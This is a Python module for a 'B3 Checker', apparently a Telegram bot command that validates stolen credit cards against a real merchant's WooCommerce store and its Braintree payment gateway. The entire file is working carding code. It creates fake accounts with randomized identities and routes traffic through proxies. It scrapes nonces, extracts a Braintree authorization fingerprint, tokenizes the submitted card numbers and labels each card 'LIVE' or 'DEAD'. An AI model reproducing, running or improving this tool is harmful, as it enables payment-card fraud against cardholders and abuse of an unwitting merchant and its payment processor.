# ============================================================
#  B3 Checker — Braintree Auth Gate (dnalasering.com)
#  /b3 command in Telegram bot
# ============================================================

import requests
import random
import string
import re
import base64
import json
import time
from datetime import datetime


SITE_URL = "https://www.dnalasering.com"

USER_AGENT = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"


def _random_email(length=10):
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length)) + "@gmail.com"


def _random_identity():
    first_names = ["James", "John", "Robert", "Michael", "William", "David", "Joseph", "Thomas", "Charles", "Daniel",
                   "Matthew", "Anthony", "Donald", "Mark", "Paul", "Steven", "Andrew", "Kenneth", "Joshua", "Kevin"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez",
                  "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore",
                  "Jackson", "Martin"]
    streets = ["Oak Street", "Maple Avenue", "Cedar Lane", "Pine Road", "Elm Drive", "Washington Blvd",
               "Main Street", "Park Avenue", "Lake View", "Hill Crest"]
    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio",
              "San Diego", "Dallas", "San Jose"]
    states = ["NY", "CA", "TX", "FL", "IL", "PA", "OH", "GA", "NC", "MI"]

    first = random.choice(first_names)
    last = random.choice(last_names)
    return {
        "first_name": first,
        "last_name": last,
        "company": f"{last} Inc",
        "address": f"{random.randint(100, 9999)} {random.choice(streets)}",
        "city": random.choice(cities),
        "state": random.choice(states),
        "postcode": str(random.randint(10000, 99999)),
        "phone": f"1{random.randint(200, 999)}{random.randint(1000000, 9999999)}",
        "email": _random_email()
    }


def _safe_regex(pattern, text, group_num=1, default=None):
    match = re.search(pattern, text)
    if match and group_num <= len(match.groups()):
        return match.group(group_num)
    return default


def _process_card(number, mm, yy, cvv, proxy_dict=None):
    """Core card processing logic. Returns (status, detail)."""
    identity = _random_identity()
    s = requests.Session()
    if proxy_dict:
        s.proxies.update(proxy_dict)

    headers = {
        'authority': 'www.dnalasering.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': SITE_URL,
        'referer': f'{SITE_URL}/my-account/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': USER_AGENT,
    }

    # Step 1: Get register nonce (retry up to 3 times)
    register_nonce = None
    for _reg_attempt in range(3):
        response = s.post(f'{SITE_URL}/my-account/', headers=headers, timeout=30)
        register_nonce = _safe_regex(r'name="woocommerce-register-nonce".*?value="([^"]+)"', response.text)
        if register_nonce:
            break
        time.sleep(1)
    if not register_nonce:
        return "Error", "Failed to get register nonce"

    # Step 2: Register account
    data = {
        'email': identity["email"],
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': '(none)',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': f'{SITE_URL}/',
        'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'wc_order_attribution_session_pages': '3',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': USER_AGENT,
        'woocommerce-register-nonce': register_nonce,
        '_wp_http_referer': '/my-account/',
        'register': 'Register',
    }
    s.post(f'{SITE_URL}/my-account/', headers=headers, data=data, timeout=30)

    # Step 3: Set billing address (retry up to 3 times)
    adn = None
    for _addr_attempt in range(3):
        response = s.get(f'{SITE_URL}/my-account/edit-address/billing/', headers=headers, timeout=30)
        adn = _safe_regex(r'name="woocommerce-edit-address-nonce".*?value="([^"]+)"', response.text)
        if adn:
            break
        time.sleep(1)
    if not adn:
        return "Error", "Failed to get address nonce"

    data = {
        'billing_email': identity["email"],
        'billing_first_name': identity["first_name"],
        'billing_last_name': identity["last_name"],
        'billing_company': identity["company"],
        'billing_country': 'US',
        'billing_address_1': identity["address"],
        'billing_address_2': '',
        'billing_city': identity["city"],
        'billing_state': identity["state"],
        'billing_postcode': identity["postcode"],
        'billing_phone': identity["phone"],
        'save_address': 'Save address',
        'woocommerce-edit-address-nonce': adn,
        '_wp_http_referer': '/my-account/edit-address/billing/',
        'action': 'edit_address',
    }
    s.post(f'{SITE_URL}/my-account/edit-address/billing/', headers=headers, data=data, timeout=30)

    # Step 4: Get payment method page nonces
    response = s.get(f'{SITE_URL}/my-account/add-payment-method/', headers=headers, timeout=30)
    client_token_nonce = _safe_regex(r'"client_token_nonce":"(.*?)"', response.text)
    woo_nonce = _safe_regex(r'id="woocommerce-add-payment-method-nonce".*?value="(.*?)"', response.text)
    if not client_token_nonce or not woo_nonce:
        return "Error", "Failed to get payment nonces"

    # Step 5: Get Braintree client token
    ajax_headers = {
        'authority': 'www.dnalasering.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': SITE_URL,
        'referer': f'{SITE_URL}/my-account/add-payment-method/',
        'user-agent': USER_AGENT,
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'action': 'wc_braintree_credit_card_get_client_token',
        'nonce': client_token_nonce,
    }
    response = s.post(f'{SITE_URL}/wp-admin/admin-ajax.php', headers=ajax_headers, data=data, timeout=30)

    try:
        encoded_data = response.json()['data']
        decoded = base64.b64decode(encoded_data).decode('utf-8')
        json_data = json.loads(decoded)
        auth = json_data.get('authorizationFingerprint')
    except (KeyError, json.JSONDecodeError, base64.binascii.Error):
        return "Error", "Failed to decode Braintree token"

    if not auth:
        return "Error", "No auth fingerprint"

    # Step 6: Tokenize card via Braintree GraphQL
    bt_headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'authorization': f'Bearer {auth}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'user-agent': USER_AGENT,
    }

    session_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))
    json_payload = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': session_id,
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': number,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvv,
                },
                'options': {'validate': False},
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    response = s.post('https://payments.braintree-api.com/graphql', headers=bt_headers, json=json_payload, timeout=30)

    try:
        token = response.json()['data']['tokenizeCreditCard']['token']
    except (KeyError, TypeError):
        return "Declined", "Tokenization Failed"

    # Step 7: Add payment method
    pm_data = [
        ('payment_method', 'braintree_credit_card'),
        ('wc-braintree-credit-card-card-type', 'master-card'),
        ('wc-braintree-credit-card-3d-secure-enabled', ''),
        ('wc-braintree-credit-card-3d-secure-verified', ''),
        ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
        ('wc_braintree_credit_card_payment_nonce', token),
        ('wc_braintree_device_data', json.dumps({"correlation_id": session_id[:36]})),
        ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
        ('wc_braintree_paypal_payment_nonce', ''),
        ('wc_braintree_device_data', json.dumps({"correlation_id": session_id[:36]})),
        ('wc-braintree-paypal-context', 'shortcode'),
        ('wc_braintree_paypal_amount', '0.00'),
        ('wc_braintree_paypal_currency', 'USD'),
        ('wc_braintree_paypal_locale', 'en_us'),
        ('wc-braintree-paypal-tokenize-payment-method', 'true'),
        ('woocommerce-add-payment-method-nonce', woo_nonce),
        ('_wp_http_referer', '/my-account/add-payment-method/'),
        ('woocommerce_add_payment_method', '1'),
    ]

    response = s.post(f'{SITE_URL}/my-account/add-payment-method/', headers=headers, data=pm_data, timeout=30)

    if any(x in response.text for x in ['Nice!', 'AVS', 'avs', 'payment method was added', 'successfully added']):
        return "Approved", "LIVE — Payment method added"
    else:
        error_match = re.search(r'<ul class="woocommerce-error".*?<li>(.*?)</li>.*?</ul>', response.text, re.DOTALL)
        if error_match:
            error_msg = re.sub(r'<[^>]+>', '', error_match.group(1)).strip()
            return "Declined", error_msg
        return "Declined", "DEAD"


def check_card(cc_line, proxy_dict=None):
    """Public API: check a single card. Returns formatted string."""
    start = time.time()
    try:
        parts = cc_line.strip().split('|')
        if len(parts) != 4:
            return "Declined | Invalid format"

        number, mm, yy, cvv = parts

        for attempt in range(3):
            try:
                status, detail = _process_card(number, mm, yy, cvv, proxy_dict)
                elapsed = round(time.time() - start, 2)
                return f"{status} | {detail} | {elapsed}s"
            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
                if attempt < 2:
                    time.sleep(2)
                    continue
                return "ConnError | Connection failed"
            except Exception as e:
                if attempt < 2:
                    time.sleep(2)
                    continue
                return f"Error | {str(e)[:60]}"

    except Exception as e:
        return f"Error | {str(e)[:60]}"


def probe_site():
    """Health check for the B3 gate."""
    try:
        r = requests.get(f'{SITE_URL}/my-account/add-payment-method/', timeout=15)
        if r.status_code == 200 and 'braintree' in r.text.lower():
            return True, "Braintree payment page active"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, str(e)[:60]
